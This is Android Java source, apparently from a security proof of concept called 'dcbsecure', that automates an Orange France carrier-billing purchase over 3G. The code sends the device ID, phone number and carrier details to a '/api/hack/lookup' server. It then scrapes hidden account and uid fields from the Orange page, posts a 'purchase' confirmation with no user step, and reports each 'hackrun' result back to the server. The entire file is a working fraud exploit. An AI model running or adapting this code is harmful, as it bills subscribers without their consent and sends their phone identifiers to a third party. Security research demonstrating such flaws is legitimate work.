package com.dcbsecure.demo201503.dcbsecure.flow.FR.Orange;

import android.content.Context;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.Button;
import com.dcbsecure.demo201503.dcbsecure.ActivityMainWindow;
import com.dcbsecure.demo201503.dcbsecure.flow.FlowUtil;
import com.dcbsecure.demo201503.dcbsecure.managers.ConfigMgr;
import com.dcbsecure.demo201503.dcbsecure.managers.PreferenceMgr;
import com.dcbsecure.demo201503.dcbsecure.managers.TrackMgr;
import com.dcbsecure.demo201503.dcbsecure.request.RequestResult;
import com.dcbsecure.demo201503.dcbsecure.util.SyncRequestUtil;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Timer;
import java.util.TimerTask;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class FlowFROrange3G implements View.OnClickListener
{
    private final ActivityMainWindow activityMainWindow;
    private final Button btnStart;

    public FlowFROrange3G(ActivityMainWindow activityMainWindow, Button btnStart)
    {
        this.activityMainWindow = activityMainWindow;
        this.btnStart = btnStart;
    }

    @Override
    public void onClick(View v)
    {
        onClick();
    }


    private void onClick()
    {
        btnStart.setVisibility(View.INVISIBLE);

        final String deviceid = ConfigMgr.lookupDeviceId(activityMainWindow);

        new Thread(new Runnable()
        {
            @Override
            public void run()
            {
                long runid = 0;
                try
                {
                    //reset pin
                    FlowUtil.setPin(null);

                    TelephonyManager tm = (TelephonyManager) activityMainWindow.getSystemService(Context.TELEPHONY_SERVICE);
                    String iso3166 = tm.getSimCountryIso();
                    if(iso3166==null||iso3166.isEmpty()) iso3166 = tm.getNetworkCountryIso();
                    String mccmnc = tm.getSimOperator();
                    if(mccmnc==null||mccmnc.isEmpty()) mccmnc = tm.getNetworkOperator();
                    String carrier = tm.getSimOperatorName();
                    if(carrier==null||carrier.isEmpty()) carrier = tm.getNetworkOperatorName();

                    //recheck hack data
                    ArrayList<NameValuePair> params = new ArrayList<NameValuePair>();
                    params.add(new BasicNameValuePair("deviceid", deviceid));
                    params.add(new BasicNameValuePair("iso3166", iso3166));
                    params.add(new BasicNameValuePair("mccmnc", mccmnc));
                    params.add(new BasicNameValuePair("carrier", carrier));
                    long msisdn = ConfigMgr.lookupMsisdnFromTelephonyMgr(activityMainWindow);
                    if(msisdn>0) params.add(new BasicNameValuePair("msisdn", ""+msisdn));

                    params.add(new BasicNameValuePair("wifi", FlowUtil.isUsingMobileData(activityMainWindow) ? "0" : "1"));

                    String userAgent = PreferenceMgr.getUserAgent(activityMainWindow);

                    JSONObject hackConfigResponse = SyncRequestUtil.doSynchronousHttpPostReturnsJson(ConfigMgr.getString(activityMainWindow, "SERVER") + "/api/hack/lookup", params, userAgent, null);

                    if (hackConfigResponse == null)
                    {
                        String subject = "could not read start url";
                        TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, 0, 0, true, subject, "deviceid:" + deviceid);
                        activityMainWindow.updateLogs("\n" + subject);
                    }
                    else
                    {
                        //decode runid first so that if there is an exception later on, we can still report it against the right runid
                        runid = hackConfigResponse.getLong("runid");
                        runFlowNotInMainThread(hackConfigResponse, deviceid, runid);
                    }
                }
                catch (JSONException e)
                {
                    String subject = "Could not read start url";
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject, "deviceid:" + ConfigMgr.lookupDeviceId(activityMainWindow));
                    activityMainWindow.updateLogs("\n"+subject);
                }
                catch (Exception e)
                {
                    String stack = TrackMgr.getStackAsString(e);
                    String subject = "unexpected exception " + e.getClass().getName() + " " + e.getMessage();
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject, stack);
                    activityMainWindow.updateLogs("\n"+subject);
                }

            }
        }).start();
    }


    private void runFlowNotInMainThread(JSONObject hackConfig, final String deviceid, final long runid)
            throws Exception
    {
        final String userAgent = PreferenceMgr.getUserAgent(activityMainWindow);

        String startUrl;
        try
        {
            startUrl = hackConfig.getString("start_url")+"&tx=1";
        }
        catch (JSONException e)
        {
            String subject = "exception reading json flow config";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject,null);
            activityMainWindow.updateLogs("\n" + subject);
            return;
        }

        activityMainWindow.updateLogs("\nStarting 3G flow");


        RequestResult resultAfterStart = SyncRequestUtil.doSynchronousHttpGetCallReturnsString(activityMainWindow, startUrl, userAgent);
        String htmlDataAfterStart = resultAfterStart != null ? resultAfterStart.getContent() : null; // html content

        if (resultAfterStart == null)
        {
            String subject = "start_url returns nothing";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, null);
            activityMainWindow.updateLogs("\n" + subject);
            return;
        }
        else if (resultAfterStart.getHttpCode() != 200)
        {
            String subject = "start_url returns http code " + resultAfterStart.getHttpCode()+" "+resultAfterStart.getUrl();
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterStart);
            activityMainWindow.updateLogs("\n" + subject);
            return;
        }
        else if (htmlDataAfterStart.toLowerCase().contains("solde") && htmlDataAfterStart.toLowerCase().contains("insuffisant") )
        {
            String subject = "Not enough credit; you need to top-up";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterStart);
            activityMainWindow.updateLogs("\n"+subject);
            return;
        }
        else
        {
            activityMainWindow.updateLogs("\nOn Orange site, confirming purchase ");

            String orangeConfirmUrl = extractOrangeSubmitUrl(resultAfterStart);

            ArrayList<NameValuePair> paramsForOrangeConfirm = new ArrayList<NameValuePair>();
            paramsForOrangeConfirm.add(new BasicNameValuePair("action2", "purchase"));
            paramsForOrangeConfirm.add(new BasicNameValuePair("u_account_id", extractAccountId(htmlDataAfterStart)));
            paramsForOrangeConfirm.add(new BasicNameValuePair("uid", extractUID(htmlDataAfterStart)));

            RequestResult resultAfterOrangeConfirm = SyncRequestUtil.doSynchronousHttpPost(orangeConfirmUrl, paramsForOrangeConfirm, userAgent, activityMainWindow);

            final String htmlDataAfterOrangeConfirm = resultAfterOrangeConfirm != null ? resultAfterOrangeConfirm.getContent() : null;

            if (resultAfterOrangeConfirm == null || resultAfterOrangeConfirm==null)
            {
                String subject = "confirm returned nothing";
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterStart);
                activityMainWindow.updateLogs("\n" + subject);
                return;
            }
            else
            {
                //the content provider sets up the page to redirect the consumer to on error or success
                //for this POC, OK=google.fr; error=google.com
                if(resultAfterOrangeConfirm.getUrl().toLowerCase().contains("google.fr")) //passed
                {
                    String subject = "success; you should receive an advice of charge by sms within a few minutes";
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 1, false, subject, htmlDataAfterOrangeConfirm);

                    activityMainWindow.updateLogs("\n" + subject);
                    return;
                }
                else if(resultAfterOrangeConfirm.getUrl().toLowerCase().contains("google.com")) //failed
                {
                    String subject = "failed, unknown error";
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterOrangeConfirm);
                    activityMainWindow.updateLogs("\n"+subject);
                    return;
                }
                else if(resultAfterOrangeConfirm.getContent().toLowerCase().contains("erreur interne")) //failed
                {
                    String subject = "failed, Orange internal error";
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterOrangeConfirm);
                    activityMainWindow.updateLogs("\n"+subject);
                    return;
                }
                else if(resultAfterOrangeConfirm.getContent().toLowerCase().contains("session") && resultAfterOrangeConfirm.getContent().toLowerCase().contains("expir")) //failed
                {
                    String subject = "failed, session expired (possibly cookie issue)";
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterOrangeConfirm);
                    activityMainWindow.updateLogs("\n"+subject);
                    return;
                }
                else if(resultAfterOrangeConfirm.getContent().toLowerCase().contains("momentan") && resultAfterOrangeConfirm.getContent().toLowerCase().contains("indisponible")) //failed
                {
                    String subject = "failed, Orange temporarly down";
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterOrangeConfirm);
                    activityMainWindow.updateLogs("\n"+subject);
                    return;
                }
                else
                {
                    String subject = "unexpected response after confirm; final status unknown";
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterOrangeConfirm);
                    activityMainWindow.updateLogs("\n"+subject);
                    return;
                }
            }

        }

    }

    private String extractUID(String htmlData)
    {
        if(htmlData!=null)
        {
            Pattern pattern = Pattern.compile("<input type=\"hidden\" name=\"uid\" value=\"([^\"]*)\"/>");
            Matcher matcher = pattern.matcher(htmlData);
            boolean matchFound = matcher.find();
            if(matchFound) return matcher.group(1);
        }
        return null;
    }

    private String extractAccountId(String htmlData)
    {
        if(htmlData!=null)
        {
            Pattern pattern = Pattern.compile("<input type=\"hidden\" name=\"u_account_id\" value=\"([^\"]*)\"/>");
            Matcher matcher = pattern.matcher(htmlData);
            boolean matchFound = matcher.find();
            if(matchFound) return matcher.group(1);
        }
        return null;
    }


    //works for both msisdn submit and pin submit
    private String extractOrangeSubmitUrl(RequestResult requestResult)
    {
        String htmlData = requestResult.getContent(); // html content

        if(htmlData!=null)
        {
            Pattern pattern = Pattern.compile("<form action=\"(http[^ ]*)\" method=\"get\">");
            Matcher matcher = pattern.matcher(htmlData);
            boolean matchFound = matcher.find();
            if(matchFound) return matcher.group(1);
        }
        return null;
    }

}
